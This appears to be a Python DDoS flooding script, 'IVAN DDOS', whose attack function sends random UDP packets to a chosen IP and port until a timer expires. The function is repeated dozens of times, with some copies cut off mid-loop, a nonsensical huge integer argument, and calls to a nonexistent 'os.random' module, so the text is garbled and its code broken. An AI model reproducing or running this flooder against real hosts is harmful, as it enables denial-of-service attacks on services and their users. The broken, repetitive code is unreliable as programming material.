    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
